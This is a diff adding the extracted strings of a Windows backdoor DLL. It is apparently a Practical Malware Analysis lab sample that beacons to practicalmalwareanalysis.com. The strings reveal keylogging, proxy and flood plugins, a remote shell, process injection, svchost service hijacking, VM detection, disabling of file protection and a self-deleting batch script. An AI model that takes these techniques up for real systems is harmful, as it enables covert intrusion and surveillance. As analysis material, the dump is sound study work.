@@ -1,0 +1,1839 @@
+!This program cannot be run in DOS mode.
+bRich
+.text
+`.rdata
+@.data
+xdoors_d^,
+.rsrc
+@.reloc
+VWj@Y3
+TSUVW
+_^]3
+D$HUP
+D$Tj P
+D$H]UP
+D$Dj:P
+D$Dj@P
+D$Dj&P
+D$DP
+D$LP
+D$Dj:P
+D$DUP
+D$Dj:P
+D$DP
+D$DPt
+D$ P
+D$Dj@P
+D$DUP
+D$Dj@P
+D$DP
+D$DP
+D$0P
+D$$j
+D$Dj&P
+D$DUP
+D$Dj&P
+D$DP
+D$DP
+D$@P
+D$4j
+TSUVW
+_^]3
+D$HUP
+D$Tj P
+D$H]UP
+D$Dj:P
+D$Dj@P
+D$Dj&P
+D$DP
+D$LP
+D$Dj:P
+D$DUP
+D$Dj:P
+D$DP
+D$DPt
+D$ P
+D$Dj@P
+D$DUP
+D$Dj@P
+D$DP
+D$DP
+D$0P
+D$$j
+D$Dj&P
+D$DUP
+D$Dj&P
+D$DP
+D$DP
+D$@P
+D$4j
+SUVW
+YY_^]3
+hx5	
+PhT5	
+h@5	
+D$@P
+D$4j
+h@5	
+D$$j
+jDPW
+jDPW
+jDPW
+D$HSP
+D$0<
+\4DN<
+D$Hh45	
+D$PPW
+D$Hh(5	
+D$Hh
+D$QPW
+D$Hh
+D$Hh
+D$MP
+D$Hh
+D$Hh
+D$LP
+D$Hh
+D$Hh
+D$Hh
+D$Hh
+D$Hh
+SSSh@
+D$Hh
+SSShN
+D$Hh
+SSSh3
+D$Hh
+SSSh
+D$Hh|4	
+SSSh
+D$Hhp4	
+SSSh
+D$Hh`4	
+SSSh
+D$HhP4	
+SSShQ
+D$HhH4	
+D$HSPh8G
+D$Hh@4	
+D$HSPh
+D$Hh84	
+D$Hh,4	
+D$Hh$4	
+D$Hh
+D$DP
+D$KPW
+D$Hh
+D$Hh
+D$Hh
+D$Hh
+h|3	
+L$DQW
+D$Hhl3	
+hX3	
+D$HhL3	
+h@3	
+h03	
+D$Hh$3	
+hd6	
+h\6	
+hT6	
+hH6	
+h@6	
+hH6	
+h@6	
+h<6	
+u,9]
+h(6	
+%<,u
+SVWj?3
+hd6	
+u,9]
+h@7	
+h(6	
+hx6	
+QQh88	
+h$8	
+hd8	
+hT8	
+PhP8	
+YPhD8	
+WPj(3
+Phh8	
+SVW3
+Yu"h
+h(9	
+_^[]
+hX9	
+hL9	
+Yu	S
+h@9	
+Phd9	
+u#Vj
+SWjI3
+Vhde
+RhTe
+Vhde
+RhDe
+YYPS
+WPVhx9	
+SVWj
+h@5	
+hP:	
+hD:	
+h@5	
+hP:	
+h8:	
+h0:	
+PWWh
+u{9}
+h@5	
+hd6	
+h|:	
+VWj@3
+ht=	
+hP=	
+hd6	
+h4=	
+h,=	
+hd6	
+PhT<	
+h0<	
+hT;	
+Y_^[
+SUVW
+VSSh
+D$ P
+u!SS
+t$0S
+uvSS
+YPh!G
+t$0S
+t$0S
+_^]3
+VWt#
+jIY3
+h0>	
+PVVj VVV
+h0>	
+PVVj VVV
+SWj@3
+ShX>	
+PShP>	
+h@>	
+SPh?
+hP:	
+hD:	
+ShP:	
+hD:	
+SPh?
+hP:	
+h8:	
+ShP:	
+h8:	
+SVWj?3
+h88	
+h$8	
+h$?	
+SVW3
+hL@	
+h8@	
+h$@	
+h@?	
+Wj@3
+_tGj
+hh@	
+h`@	
+Wj@3
+hx@	
+hP:	
+SVWj
+Ph,A	
+F;t$
+Wj@3
+Ph|A	
+Ph\A	
+hPA	
+VhP:	
+VhP:	
+hP:	
+WPj(3
+Phh8	
+t$;E
+Yt68
+t2PS
+%h|B	
+hpB	
+hXB	
+h8B	
+h0B	
+h,B	
+V9D$
+SUVW
+hXMV
+hXMV
+hd8	
+SVW3
+$0C	
+h$C	
+F8@S
+v<SS
+SVW3
+h`C	
+hLC	
+hLC	
+SVWj
+t(Wh
+,SVWh(D	
+YYSj
+t-9]
+Y_^[
+,SVWh(D	
+YYSj
+t-9]
+Y_^[
+SVh0C	
+h$C	
+j,QS
+j Pj
+5 2	
+PhT5	
+tVHtCHt5Ht*Ht
+VWj@Y3
+hhD	
+hXD	
+hLD	
+h@D	
+h4D	
+=H2	
+=T2	
+PPPjV
+%T2	
+=H2	
+_^][j
+htD	
+SVW3
+X_^[
+5,2	
+%82	
+%<2	
+SSSh
+;582	
+5,2	
+htD	
+|SVW3
+WWWh
+WWSj
+Wh,2	
+VSWW
+ug9=02	
+582	
+5,2	
+9=82	
+upWWh@
+5,2	
+5D2	
+5,2	
+5D2	
+0SVW
+9=02	
+9542	
+=02	
+9=02	
+582	
+542	
+5,2	
+5,2	
+SWVVVh
+SVWj
+h|:	
+SSSh
+hMPG4hvidc
+SSSjV
+PhT5	
+YYj:
+SSShAq
+htD	
+/tfHtT
+t<Ht
+`SV3
+tejD
+_WVP
+PVVVVVV
+SSSh
+hMPG4hvidc
+SSSjV
+PhT5	
+SSShAq
+htD	
+/tfHtT
+t<Ht
+SVWh
+h E	
+SVW3
+h(E	
+h$E	
+h(E	
+h$E	
+h,E	
+t<j"
+t99]
+t*SP
+Ph@E	
+h0E	
+h0E	
+hDE	
+hPE	
+YtCj@3
+hPE	
+Ph@E	
+h0E	
+h0E	
+Ph@E	
+.tLS
+h0E	
+h8E	
+Pt%W
+Ph@E	
+h0E	
+h8E	
+hTE	
+Yt=V
+SVW3
+hpE	
+tI=$
+PhT5	
+hxE	
+YSVP
+Yt+S
+=UUU
+=UUU
+SVWj
+SVWj
+PhT5	
+tCHt8Ht-Ht"Ht
+=`2	
+=\2	
+%\2	
+QSU3
+V9-X2	
+t$$h`
+5X2	
+n,PU
+5p2	
+5p2	
+=d2	
+~,UUP
+t$4h`
+5X2	
+5p2	
+5p2	
+5p2	
+5p2	
+X_^][Y
+_^[d
+Shde
+SUVW
+Rh$e
+_^][
+Whde
+RhTe
+h8F	
+5p2	
+5`2	
+5p2	
+t|VV
+5p2	
+5p2	
+95X2	
+t#jd
+5X2	
+5X2	
+5p2	
+5\2	
+5p2	
+vidchMPG4W
+hDIVXW
+95X2	
+5p2	
+5p2	
+5p2	
+>t	HHt
+5p2	
+SVWhhF	
+5x2	
+5x2	
+tSj V
+hXF	
+h<F	
+Y_^[
+W9^$t
+5|2	
+5x2	
+F$_^[
+h0G	
+9~ u
+tLSj2[WWj
+h`G	
+~ X_^
+9~(t
+h\H	
+h0H	
+F(_^
+9^(u
+^(X_^[
+hDI	
+hxI	
+PhT5	
+5x2	
+5x2	
+5x2	
+5t2	
+5x2	
+5x2	
+5t2	
+SVWj@3
+PVWj
+LSV3
+0SV3
+tnh?
+LSV3
+LSV3
+LSV3
+<SV3
+VVVVVVVj
+VVVVVVVj
+t%9u
+u VVVVVVVj
+Sj(P
+t9j@
+tcVVVV
+PhT5	
+zVW3
+j@Y3
+hHJ	
+t3SSW
+htJ	
+hLJ	
+hHK	
+h(K	
+SVW3
+hxL	
+h`L	
+h8L	
+u1SSSSSSSj
+u1SSSSSSSj
+u;SSSSSSSj
+hpK	
+hxL	
+h`L	
+QWSP
+h8L	
+VHtHHt3Ht
+Hu_3
+SWh@
+hd6	
+hHJ	
+hhD	
+hd6	
+hHJ	
+hhD	
+YYu8;
+YYu8;
+VVVh
+hX9	
+WWWht
+hL9	
+WWWhe
+WWWhV
+SVW3
+h`M	
+hTM	
+VVWPVV
+h|:	
+h|:	
+hpM	
+SVWj@Z3
+hd6	
+hHJ	
+hdN	
+hTN	
+VPh4N	
+YY_^3
+SVW3
+hd6	
+hHJ	
+hdO	
+hDO	
+hTN	
+h O	
+SVW3
+t)j V
+hLR	
+t$PVh
+ujhpQ	
+VhhQ	
+hLR	
+PWh(Q	
+SSSh
+h,A	
+hdP	
+PhXP	
+Yu9h
+h$P	
+t PWh
+VhhQ	
+h,A	
+hdP	
+hlT	
+h@T	
+hlT	
+Y@PVj
+PhdS	
+Ph<S	
+hdN	
+h,S	
+hHJ	
+h$S	
+Y@PVj
+hhR	
+Ph`U	
+hDU	
+h(U	
+t$PWh
+uEhpQ	
+VhhQ	
+h,A	
+hdP	
+h@T	
+hHJ	
+htV	
+Sh4T	
+Ph8V	
+h|U	
+Sh4T	
+Ph8V	
+tZSS
+PSSW
+H_^[
+Wj@3
+hd6	
+hTN	
+VPh4N	
+PhhW	
+Ph(W	
+SWj@3
+Whd6	
+hd6	
+Ytmj@3
+Wj@3
+VWj@3
+h0M	
+Ph`Y	
+PhHY	
+hHJ	
+Ph0Y	
+hhD	
+PQPP
+PQPP
+j@Y3
+PQPP
+PhpX	
+Ph X	
+h0M	
+h\Z	
+hd6	
+hDZ	
+hHJ	
+h,Z	
+hhD	
+hd6	
+Ytqj@3
+Wj@3
+hxY	
+h\\	
+hD[	
+h4[	
+h [	
+h\\	
+hTN	
+PSSSj
+htZ	
+_^[t	
+qYBc
+QQVW
+jxY+
+@SVW
+QZ^&
+1D")
+SVWh,E	
+_^[]
+SVWh,E	
+Wj@3
+_VWU
+SSWVj
+_^][
+|LSU
+j(PQR
+T$HQR
+T$HQR
+D$ }	
+D$$~
+T$`RVPQ
+D$$Vh
+L$,PQRS
+\$8QS
+D$,u!
+ffff
+D$`R
+L$DPQ
+$_^[
+T$`Q
+t$XPV
+T$dQh
+D$(RPV
+D$<S
+D$$R
+D<PR
+T$\ha2U0R
+D$(SQ
+L$\ha2U0Q
+T$hha2U0R
+D$xRPQ
+D$HRP
+T$0P
+D$$RPQSV
+,_^[
+c@_^[
+WPQRh
+D$4z
+L$ P
+L$<PQ
+T$(QRh
+_ _^
+(W}&
+|$8QRWVh
+D$@SUV
+D$L}}
+T*Hu
+\$,K
+l$$+
+\*Hu
+T*Hu
+_^][
+D$ (
+gfff
+|$<+
+gfff
+T$p+
+gfff
+T$<+
+gfff
+gfff
+gfff
+L$`+
+D$@~(
+D$D~#
+D$8~#
+L$ 3
+gfff
+gfff
+gfff
+gfff[
+SUVW
+_^][
+WPQR
+T$$PR
+D$4WP
+D$@WP
+D$4WP
+_^][
+_^][
+_^][
+L$<j
+L$(PQ
+D$DG
+D$4u
+~mSU
+^][_
+ha2U0Q
+T$ ha2U0R
+}$PVQ
+T$4WR
+D$<VP
+8_^[
+_^][
+_^][
+=`.	
+h\.	
+h`.	
+%`.	
+=L.	
+t	WVS
+NWVS
+u7WPS
+u&WVS
+_^[]
+pvids
+?ffffff
+?ffffff
+?333333
+$@\, 
+MbP?
+4@Pg
+SHELL32.dll
+DeleteDC
+DeleteObject
+GetDIBits
+RealizePalette
+SelectPalette
+GetStockObject
+GetObjectA
+BitBlt
+SelectObject
+CreateCompatibleBitmap
+CreateCompatibleDC
+GetDeviceCaps
+CreateDCA
+CreateDIBSection
+SetBkMode
+SetTextColor
+CreateFontIndirectA
+GDI32.dll
+GetModuleFileNameExA
+EnumProcessModules
+PSAPI.DLL
+WS2_32.dll
+GetAdaptersInfo
+iphlpapi.dll
+GetCurrentProcessId
+Sleep
+WinExec
+ExitThread
+FreeLibrary
+CloseHandle
+CreateThread
+GetTickCount
+GetProcAddress
+LoadLibraryA
+DeleteFileA
+OutputDebugStringA
+WriteFile
+GetStdHandle
+GetVersionExA
+GetLastError
+GetCurrentProcess
+Process32Next
+Process32First
+CreateToolhelp32Snapshot
+GetDiskFreeSpaceA
+GetDriveTypeA
+GetLogicalDrives
+GetModuleHandleA
+GlobalMemoryStatus
+GetComputerNameA
+CopyFileA
+MoveFileExA
+GetModuleFileNameA
+SetCurrentDirectoryA
+GetCurrentDirectoryA
+GetCurrentThreadId
+OpenProcess
+GetSystemDefaultLangID
+WaitForSingleObject
+CreateRemoteThread
+GetVersion
+GlobalFree
+GlobalReAlloc
+GlobalUnlock
+GlobalLock
+GlobalAlloc
+GlobalSize
+WideCharToMultiByte
+Module32Next
+Module32First
+TerminateProcess
+SetPriorityClass
+SuspendThread
+Thread32Next
+Thread32First
+ResumeThread
+LoadLibraryW
+ProcessIdToSessionId
+LeaveCriticalSection
+EnterCriticalSection
+InitializeCriticalSection
+GetVolumeInformationA
+FindClose
+FindNextFileA
+FindFirstFileA
+SystemTimeToFileTime
+GetLocalTime
+CreateDirectoryA
+SetFileAttributesA
+GetFileAttributesA
+RemoveDirectoryA
+MoveFileA
+GetFileTime
+CreateFileA
+SetFileTime
+TerminateThread
+GetExitCodeThread
+LocalFree
+LocalAlloc
+GetWindowsDirectoryA
+GetSystemTime
+GetSystemDirectoryA
+CreateMutexA
+FreeConsole
+WriteProcessMemory
+VirtualAllocEx
+MultiByteToWideChar
+SetLastError
+ReadFile
+CreateProcessA
+GetStartupInfoA
+CreatePipe
+VirtualQuery
+KERNEL32.dll
+ExitWindowsEx
+CloseWindowStation
+CloseDesktop
+MessageBoxA
+SetThreadDesktop
+OpenDesktopA
+SetProcessWindowStation
+OpenWindowStationA
+GetThreadDesktop
+GetProcessWindowStation
+GetDesktopWindow
+BlockInput
+SendMessageA
+SystemParametersInfoA
+PostMessageA
+GetUserObjectInformationA
+OpenInputDesktop
+ReleaseDC
+GetDC
+keybd_event
+mouse_event
+GetSystemMetrics
+DrawTextA
+RedrawWindow
+GetMessageA
+PostThreadMessageA
+USER32.dll
+AdjustTokenPrivileges
+LookupPrivilegeValueA
+OpenProcessToken
+RegCloseKey
+RegQueryValueExA
+RegOpenKeyExA
+CreateProcessAsUserA
+RegSetValueExA
+RegDeleteValueA
+RegEnumKeyA
+RegOpenKeyA
+SetTokenInformation
+DuplicateTokenEx
+RegEnumValueA
+RegCreateKeyA
+RegDeleteKeyA
+CloseServiceHandle
+QueryServiceConfigA
+QueryServiceConfig2A
+OpenServiceA
+EnumServicesStatusExA
+OpenSCManagerA
+DeleteService
+ControlService
+QueryServiceStatus
+StartServiceA
+ChangeServiceConfigA
+QueryServiceStatusEx
+ChangeServiceConfig2A
+CreateServiceA
+SetServiceStatus
+RegisterServiceCtrlHandlerA
+ADVAPI32.dll
+CoUninitialize
+CoCreateInstance
+CoInitializeEx
+CoInitialize
+CoTaskMemFree
+ole32.dll
+OLEAUT32.dll
+ICImageCompress
+ICCompress
+ICClose
+ICSendMessage
+ICOpen
+MSVFW32.dll
+waveInAddBuffer
+waveInPrepareHeader
+waveInUnprepareHeader
+waveInClose
+waveInOpen
+waveInReset
+waveInStart
+WINMM.dll
+atoi
+strncpy
+memcpy
+strcpy
+strlen
+memset
+strchr
+strncmp
+memcmp
+printf
+fclose
+fwrite
+fopen
+strrchr
+strstr
+sprintf
+strcat
+_strdate
+_strtime
+fprintf
+_vsnprintf
+free
+malloc
+strtok
+strcmp
+_strupr
+strncat
+strtoul
+isdigit
+??3@YAXPAX@Z
+??2@YAPAXI@Z
+__CxxFrameHandler
+_except_handler3
+_ftol
+fread
+fseek
+wcstombs
+_CxxThrowException
+ftell
+wcslen
+_CIacos
+_CIpow
+MSVCRT.dll
+__dllonexit
+_onexit
+??1type_info@@UAE@XZ
+_initterm
+_adjust_fdiv
+_stricmp
+_strnicmp
+_strlwr
+_strrev
+xdll.dll
+InstallRT
+InstallSA
+InstallSB
+PSLIST
+ServiceMain
+StartEXS
+UninstallRT
+UninstallSA
+UninstallSB
+[This is PWD]                                                                 
+[This is RGP]                                                                 
+[This is RNA]newsnews
+[This is RUR]
+[This is RDO]newsnews.practicalmalwareanalysis.com
+[This is RIP]                                                                 
+[This is RPO]80
+[This is DVM]5
+[This is SS2]      
+[This is SSD]      
+[This is LOG]1
+[This is NTI]30
+[This is CTI]30
+.PAX
+.PAD
+.?AV_com_error@@
+I_)G
+;y&n
+?TpxADj
+?kX|
+?t"f
+vO`2<
+?;1o
+ly@4
+?	ZX
+m@:k
+uA3>
+W`e`
+?Xp?
+?>-7
+yj?c
+uX]^
+?9EGr
+?ffffff
+`TR'
+?F%u
+@ffffff
+?a2U0*
+	h"lx
+?h"lxz
+?U0*
+|a2U0
+|?5^
+@}?5^
+?#J{
+?a2U0*
+?\ A
+?EGr
+|?5^
+?$(~
+9#J{
+@:#J{
+1w-!
+?8gDio
+?:#J{
+h"lxz
+@}?5^
+?$(~
+?gDio
+1w-!
+?EGr
+@h"lxz
+8gDio
+@`vO
+@?W[
+?Dio
+	h"l
+9#J{
+?[B>
+1w-!
+9#J{
+@>yX
+@U0*
+?`vO
+@Tt$
+8gDi
+|a2U
+?gDio
+`TR'
+|?5^
+8gDio
+|a2U0
+?"lxz
+?Dio
+@>yX
+?[B>
+?>yX
+8gDio
+@:#J{
+	h"lx
+@333333
+ZB>h
+?lxz
+?}?5^
+??5^
+?>yX
+?F%u
+?Dio
+9#J{
+@`vO
+?Dio
+?U0*
+@ffffff
+	h"l
+?a2U0*
+?`vO
+?`vO
+@F%u
+9#J{
+?2w-!
+8EGr
+`TR'
+?Zd;
+?8gDio
+@333333
+1w-!
+?F%u
+|?5^
+?Tt$
+?U0*
+?EGr
+@EGr
+?a2U0*
+`TR'
+	h"l
+?aTR'
+@h"lxz%
+|?5^
+?w-!
+?lxz
+	h"lx
+8gDi
+8gDi
+|a2U0
+?\ A
+?[B>
+@Dio
+1w-!
+gDio
+gDio
+?a2U0*
+333333
+8gDi
+1w-!_
+1w-!_
+9#J{
+8gDio
+6:?o
+	h"lx
+?TR'
+?"lxz
+9#J{
+?k,am
+?TUh 
+?;R}
+?c^G
+s"?@
+0a4+
+?v7Ou
+Df.p
+!6X8
+?d:tz
+?pm4
+??:u
+??:u
+warning LSP High 
+warning LSP Low 
+.?AVtype_info@@
+rundll64.exe
+rundll32.exe
+ipconfig /flushdns
+Plug_KeyLog_Main
+plug_keylog
+Plug_Proxy_Main
+xproxy.dll
+plug_proxy
+Plug_Flood_StopMain
+plug_stopflood
+PluG_Flood_Main
+xflood.dll
+plug_flood
+Plug_Acq_Main
+xacq.dll
+plug_acq
+Plug_Dev_Main
+xdev.dll
+plug_dev
+Plug_Sys_Main
+xsys.dll
+plug_sys
+update
+logoff
+shutdown
+reboot
+fgets
+message
+startxservices
+startxprocess
+startxsound
+startxvideo
+startxreg
+startxfile
+startxscreen
+startxcmd
+uninstall
+uninstall+reboot
+suspendx
+urlh
+urln
+exeh
+exen
+delgroupinfo
+setgroupinfo
+delhostinfo
+sethostinfo
+                
+socket() GetLastError reports %d
+Plug_KeyLog_Restart
+xkey.dll
+WSAStartup() error: %d
+RETR %s
+PASV
+SIZE %s
+TYPE I
+CWD %s
+PASS %s
+USER %s
+Socket error....
+IEuser@
+anonymous
+FTP://
+ftp://
+Content-Length:
+HTTP/1.1 5
+HTTP/1.1 3
+HTTP/1.1 4
+Expires: 0
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Connection: Keep-Alive
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1)
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
+Host: 
+ HTTP/1.1
+GET 
+HTTP://
+http://
+GetLastInputInfo
+user32.dll
+[%s %s]
+xinstall.log
+AdjustTokenPrivileges
+LookupPrivilegeValue
+SeDebugPrivilege
+error on %s, error code %d. 
+OpenProcessToken
+0.0.0.0
+Microsoft TV/Video Connection
+VMware Virtual Ethernet Adapter
+Fail To Send()
+%s %s
+ftp:////
+http:////
+SeShutdownPrivilege
+HardwareInformation.MemorySize
+System
+\Device\Video0
+HARDWARE\DEVICEMAP\VIDEO
+F333
+kernel32.dll
+GetDiskFreeSpaceExA
+~MHz
+HARDWARE\DESCRIPTION\System\CentralProcessor\0
+default
+GroupInfo
+HostInfo
+SOFTWARE\Microsoft\Windows\CurrentVersion
+Fail To Create Snap Shot
+(1) Enter Current Directory Error,Update Failed
+(2) Get DLL FileName Error,Update Failed
+(3) Move '%s' To '%s' Failed,Perhaps Other Process Updateing|Updated Same Module
+(4) Resume '%s' To '%s' Failed,Update Failed
+(4) Resume '%s' To '%s' Successfully,Update Failed
+(4) Get New FileName Error,Update Failed
+(6) Update Successfully,Will Take Effect Until Next Reboot
+(5) New FileName As Old FileName
+(6) Resume '%s' To '%s' Successfully,Update Failed!!!
+(5) Move '%s' To '%s' Failed,Update Failed
+(5) Copy '%s' To '%s' Successfully
+(4) Get New FileName '%s'
+(3) Move '%s' To '%s' Successfully
+.ubak
+(2) Get DLL FileName '%s'
+(1) Enter Current Directory '%s'
+******************************
+[BackDoor Server Update Setup]
+******************************
+-warn
+-erro
+-stop
+-shutdown
+-reboot
+Default
+WinSta0
+winsta0\default
+EXPLORER.EXE
+%s\IEXPLORE.EXE
+Path
+SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE
+[Machine IdleTime:] %d days + %.2d:%.2d:%.2d
+[Machine UpTime:] %-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds
+[Language:] id:0x%x
+[Install Log:] %d
+[Detect VM  :] %d
+[SSDT Ring3 :] %d
+[SSDT Ring0 :] %d
+[Host connect Type  :] %d
+[Host Reconnect Time:] %d
+[CURL Reconnect Time:] %d
+[DOMAIN_NAME:] 
+[CURL       :] 
+[HOST_NAME  :] 
+[PASS       :] 
+[PORT       :] 
+[HOST       :] 
+[Module:] 
+[Masthost:] %s:%s
+[Robot_WorkTimes:] %d
+WorkTimes
+[Robot_WorkTime :] %d
+WorkTime
+ServiceDll
+SYSTEM\CurrentControlSet\Services\%s\Parameters\
+SYSTEM\CurrentControlSet\Services\
+del %%0
+if exist "%s" goto selfkill
+del "%s"
+attrib -a -r -s -h "%s"
+:selfkill
+@echo off
+.\vmselfdel.bat
+kstarttype
+CreateToolhelp32Snapshot
+OpenProcess
+WaitForSingleObject
+CreateRemoteThread
+failed
+Load the sfc fuction failed
+unsupported version
+Windows XP
+sfc_os.dll
+Win2000
+sfc.dll
+error on get process info. 
+winlogon.exe
+xinstall.dll
+AdjustTokenPrivileges failed: %u
+LookupPrivilegeValue error:%d
+ntdll.dll
+NtQuerySystemInformation
+%-16d%-20s%d
+[%s]
+ProcessID       ProcessName         ThreadNumber
+Process32First() Fail:Error %d
+[%s]
+%-16d%-20s%d
+CreateToolhelp32Snapshot Fail:Error%d
+OpenProcessToken Error: %d
+kernel32
+OpenThread
+smss.exe
+csrss.exe
+lsass.exe
+services.exe
+svchost.exe
+Winlogon
+winsta0
+WmsgSendMessage
+DISPLAY
+.scr
+WinSta0\Winlogon
+WinSta0\Default
+logonui.exe
+rundll32.exe %s,StartEXS %s:%s
+explorer.exe
+%s%s
+%s\%s
+1234567890
+System Volume Information
+%s*.*
+HKEY_USERS
+HKEY_LOCAL_MACHINE
+HKEY_CURRENT_USER
+HKEY_CURRENT_CONFIG
+HKEY_CLASSES_ROOT
+AudioInThreadProc exit.
+MM_WIM_CLOSE 
+AudioInThreadProc start.
+CWaveIn::CloseDev: Device hasn't opened.
+CWaveIn::OpenDev: waveInOpen error.
+CWaveIn::OpenDev: Device has open.
+CWaveIn::StartThread: Strat wave in thread fail.
+CWaveIn::StartThread: Wave in thread has run.
+CWaveIn::StopThread: TerminateThread wave in thread.
+CWaveIn::StopThread: Wave in thread hasn't run.
+CWaveIn::PerPareBuffer: waveInAddBuffer error.
+CWaveIn::PerPareBuffer: waveInPrepareHeader error.
+CWaveIn::PerPareBuffer: waveInReset error.
+CWaveIn::PerPareBuffer: Buffer has been alloc.
+CWaveIn::FreeBuffer: waveInUnprepareHeader error.
+CWaveIn::FreeBuffer: m_pHdr is NULL.
+CWaveIn::FreeBuffer: Buffer hasn't been alloc.
+CWaveIn::OpenRecord: waveInStart error.
+CWaveIn::OpenRecord: You may be has begun recored.
+CWaveIn::CloseRecord: waveInReset error.
+CWaveIn::CloseRecord: Device hasn't opened.
+CWaveIn::CloseRecord: You may be hasn't begun recored.
+Completed
+SoftWare\MicroSoft\Internet Connection Wizard\
+MyStarService() -> OpenService() Error
+MyStarService() -> StartService() Error.
+StartService '%s' Successfully
+Open SCM error!
+MyStopService() -> OpenService() Error.
+MyStopService() -> ControlService() Error
+StopService '%s' Successfully
+Service '%s' Status already is Stopped.
+MyChangeService() -> OpenService '%s' Error.
+Change Service '%s' To Be Disabled
+Change Service '%s' To Be Manual-Start
+Change Service '%s' To Be Auto-Start
+Change Service '%s' Config Failed!
+Query registry service config failed!
+Alloc memory failed!
+Service '%s' Start Type Already Is Auto
+MyQueryServiceStarttype() -> OpenService '%s' Error.
+Query service starttype->%d
+_ox.dll
+.obak
+regedit.exe
+mmc.exe
+WatchaaaaaaaaMExeMutex
+GetModuleFileName() get dll path
+Kernel32
+LoadLibraryW
+Not Found Module '%s' In Any '%s' Process
+Found Module '%s' In PID %d
+Process '%s' Not Found ,Inject Failed
+Inject '%s' To Process '%s' Failed
+Inject '%s' To Process '%s' Successfully
+The PID Of Process '%s' is '%d'
+iexplore.exe
+Copy '%s' To '%s' Failed
+Copy '%s' To '%s' Successfully
+The PID Of Process '%s' Not Found
+Inject '%s' To Process '%s' Failed
+Inject '%s' To Process '%s' Successfully
+The PID Of Process '%s' is '%d'
+Copy '%s' To '%s' Failed
+Copy '%s' To '%s' Successfully
+Found Virtual Machine,Install Cancel.
+Description
+SYSTEM\ControlSet001\Services\
+win.ini
+Config service %s ok.
+%s error %d
+RegSetValueEx(ServiceDll)
+%SystemRoot%\system32\
+RegCreateKey(Parameters)
+Parameters
+RegOpenKeyEx(%s) KEY_SET_VALUE error %d.
+CreateService(%s) With Description '%s' SUCCESS. Config it
+CreateService(%s) error %d
+%SystemRoot%\System32\svchost.exe -k netsvcs
+OpenSCManager()
+Now Will Install Default Service '%s' With Description '%s' 
+ - %s
+you specify service name not in Svchost\netsvcs, must be one of following:
+RegQueryValueEx(Svchost\netsvcs)
+netsvcs
+RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
+%s System Services
+Irmon
+Replace Old Service '%s' Failed,Install Cancle
+Old Module Not Runing,New ModuleName As Old,Will Take Effect Soon.
+Old Module Have Been Free,New ModuleName As Old,Will Take Effect Soon.
+%s.obak
+%s\dllcache\%s
+Inject '%s' to  PID '%d' Successfully!
+Old Module '%s' Still Runing,New Module '%s' Will Inject To PID '%d'
+Service '%s' Infect Successfully
+ServiceDll Set As '%s' Successfully
+ServiceMain Set As 'ServiceMain'
+RegSetValueEx(ServiceMain)
+ServiceMain
+RegQueryValueEx(%s) KEY_SET_VALUE error %d.
+Services '%s' Have Been Infected! Install Failed!
+ServiceMainbak
+\Parameters
+You Specify Service Name Not In Svchost\netsvcs, must be one of following:
+NtmsSvc
+Exception Catched 0x%X
+DeleteService(%s) SUCCESS.
+OpenService(%s) error %d
+OpenSCManager() error %d
+Service '%s' Do Not Need UnInstall.
+Service '%s' UnInstall Falied 2.
+Service '%s' UnInstall Falied 1.
+Service '%s' UnInstall Successfully,Please Reboot Machine To Take Effect
+ServiceMain Reset to '%s'
+Move '%s' To '%s' Successfully
+.\dllcache\%s
+%s.pbak
+ServiceDll Reset to '%s'
+.dll
+Kernel32.dll
+FreeLibrary
+Process '%s' Not Found,Uninject Failed
+Uninject '%s' From Process '%s' Failed
+Uninject '%s' From Process '%s' Failed, Module '%s' Not Found
+Uninject '%s' From Process '%s' Successfully
+'%s' Repair Failed,Bak File Lose!
+'%s' Repair Successfully,Need Reboot Machine!
+Move '%s' To '%s' Failed
+_bd.dll
+conime.exe
+MayBe Inject Mode,You Only Need Close Master Process '%s' To Uninatll This Mode
+No Found Old Bak Pe File->'%s' 
+Now Run UninstallPE %s
+Found Old Bak Pe File->'%s' 
+Get MasterProecss Path->'%s'
+Now Run UninstallSB %s
+Now Run UninstallSA %s
+Get ServiceName->'%s'
+Get ProcessName->'%s'
+Get ModuleName->'%s'
+Get ModulePath->'%s'
+Get Install Way->InstallRT
+Get Install Way->InstallPE
+Get Install Way->InstallSB Or InstallRSB
+Get Install Way->InstallSA
+Get ServiceName->'%s'
+Get ProcessName->'%s'
+Get ModuleName->'%s'
+Get ModulePath->'%s'
+CreateProcess() GetLastError reports %d
+inject
+minstall
+mmodule
+mhost
+mbase
+robotwork
+language
+uptime
+idle
+0x%02x
+enmagic
+exit
+quit
+\command.exe /c 
+\cmd.exe /c 
+Hi,Master [%d/%d/%d %d:%d:%d]
+WelCome Back...Are You Enjoying Today?
+Machine UpTime  [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds]
+Machine IdleTime [%-.2d Days %-.2d Hours %-.2d Minutes %-.2d Seconds]
+Encrypt Magic Number For This Remote Shell Session [0x%02x]
+00<0G0\0
+252I2
+3%343=3B3L3Z3
+5&5:5
+6%6.636=6K6y6
+7#7-7D7O7Y7
+8#8*858?8L8R8W8l8v8
+8-9^9
+9*:J:a:i:s:
+;E;^;
+<A<S<[<l<~<
+=1=A=S=c=y=
+><>u>
+?+?:?@?Q?X?v?
+0$0)070C0w0
+2%2Y2
+424L4`4
+575>5`5
+636I6P6
+7;7^7e7
+808\8r8y8
+9:9S9Z9
+:l:s:y:
+;>;j;
+<9<T<`<n<
+0E0P0h0
+151j1
+2*262S2`2
+3"3D3f3
+4,525[5a5f5m5
+6 6E6L6[6g6n6u6
+6<7C7M7S7X7^7l7s7}7
+8(8M8X8f8z8
+959E9[9d9M:R:j:
+;1;O;c;
+<:=Q=]=e=k=
+>&>/><>M>o>v>
+?-?@?G?]?e?o?
+0*0B0d0r0|0
+2$202d2j2
+4'4?4m4
+565K5o5
+6;6Y6c6p6
+7'7D7J7T7[7i7s7
+7$8.848:8@8X8_8r8|8
+:c:m:x:
+:E;P;i;r;
+<5<@<E<N<]<w<
+<"=)=.=5=H=
+=D>K>
+?*?0?i?q?
+0 0Y0a0p0
+1!1J1Y1f1s1
+1,2_2d2o2v2
+3#3.343M3
+3<4G4U4_4
+6!6)676G6`6k6
+6&717D7M7[7n7
+8*8F8V8y8
